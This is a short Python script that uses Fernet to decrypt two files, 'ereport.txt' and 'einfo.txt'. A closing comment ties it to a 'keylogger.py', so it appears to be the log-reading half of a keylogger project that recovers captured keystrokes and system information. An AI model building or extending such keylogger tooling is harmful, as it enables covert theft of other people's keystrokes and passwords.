from cryptography.fernet import Fernet
import time

key = "" #provide same key
path = "" #provide a path
encryptedLog = "/ereport.txt"
encryptedSysInfo = "/einfo.txt"

encryptedFiles = [path+encryptedLog, path+encryptedSysInfo] 

i = 0

while i<2:
    with open(encryptedFiles[i],"rb") as f:
        data = f.read()
    
    decrypted = Fernet(key).decrypt(data)

    with open(encryptedFiles[i],"wb") as g:
        g.write(decrypted)

    i += 1

#use the same key in keylogger.py and here
